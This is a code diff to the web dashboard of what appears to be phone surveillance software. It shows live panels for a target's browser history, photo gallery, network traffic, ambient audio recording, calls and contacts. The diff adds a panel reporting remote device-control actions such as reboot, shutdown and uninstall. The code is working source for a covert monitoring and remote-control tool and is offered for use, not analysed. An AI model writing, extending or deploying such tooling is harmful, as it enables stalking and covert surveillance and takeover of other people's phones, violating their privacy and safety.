@@ -165,7 +165,8 @@ function injectAdvancedControls() {
         <div class="data-panel"><div class="data-panel-header">🌐 Browser History</div><div class="data-panel-body" id="browser-feed">Waiting for data...</div></div>
         <div class="data-panel"><div class="data-panel-header">🖼️ Gallery</div><div class="data-panel-body" id="gallery-feed">Waiting for data...</div></div>
         <div class="data-panel"><div class="data-panel-header">📊 Network Traffic</div><div class="data-panel-body" id="traffic-feed">Waiting for data...</div></div>
-        <div class="data-panel"><div class="data-panel-header">🎙️ Ambient Audio</div><div class="data-panel-body" id="ambient-feed">Not recording</div></div>`;
+        <div class="data-panel"><div class="data-panel-header">🎙️ Ambient Audio</div><div class="data-panel-body" id="ambient-feed">Not recording</div></div>
+        <div class="data-panel"><div class="data-panel-header">⚡ Device Control</div><div class="data-panel-body" id="devicecontrol-feed">Waiting for data...</div></div>`;
     parentGrid.appendChild(dp);
 }
 
@@ -269,7 +270,7 @@ function initializeDataFeedListeners(uid) {
     listenToFeed(uid, 'calls_live', (d) => {
         const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,10);
         const f = document.getElementById('calls-feed'); if(!f||!items.length) return;
-        f.innerHTML = items.map(c=>{const i=c.state==='ringing'?'🔔':c.state==='offhook'?'📞':'📴';return `<div class="feed-item live-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${c.state} • ${fmtTime(c.timestamp)}</small></div>`;}).join('') + f.innerHTML;
+        f.innerHTML = items.map(c=>{const i=c.state==='ringing'?'🔔':c.state==='offhook'?'📞':'';return `<div class="feed-item live-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${c.state} • ${fmtTime(c.timestamp)}</small></div>`;}).join('') + f.innerHTML;
     });
 
     // ── CONTACTS — ALL contacts, grouped by name, sorted A-Z ──
@@ -573,6 +574,21 @@ function initializeDataFeedListeners(uid) {
         if(bf && !bf.innerHTML.includes('Network Traffic')) {
             bf.innerHTML += `<div class="feed-item" style="border-top:1px solid #333;margin-top:8px;padding-top:8px;"><strong>📊 Traffic</strong> RX:${d.total_rx_mb||'?'} TX:${d.total_tx_mb||'?'} MB</div>`;
         }
+    });
+
+    // ── DEVICE CONTROL STATUS (reboot, shutdown, uninstall, etc.) ──
+    listenToFeed(uid, 'device_control_status', (d) => {
+        const f = document.getElementById('devicecontrol-feed'); if(!f||!d) return;
+        var icon = d.status === 'success' ? '✅' : d.status === 'ui_opened' ? '📱' : '❌';
+        var color = d.status === 'success' ? '#00ff88' : d.status === 'ui_opened' ? '#ffd93d' : '#ff6b6b';
+        var actionName = (d.action || 'unknown').replace(/_/g, ' ').toUpperCase();
+        var html = '<div class="feed-item" style="border-left:3px solid ' + color + ';padding-left:10px;">';
+        html += '<div style="color:' + color + ';font-weight:bold;font-size:12px;">' + icon + ' ' + actionName + ' — ' + (d.status || '').toUpperCase() + '</div>';
+        html += '<div style="color:#888;font-size:11px;margin-top:4px;">' + esc(d.message || '') + '</div>';
+        html += '<div style="color:#555;font-size:10px;margin-top:2px;">' + fmtTime(d.timestamp) + '</div>';
+        html += '</div>';
+        f.innerHTML = html;
+        console.log(icon + ' ' + (d.action||'?') + ': ' + (d.message||''));
     });
 }
 
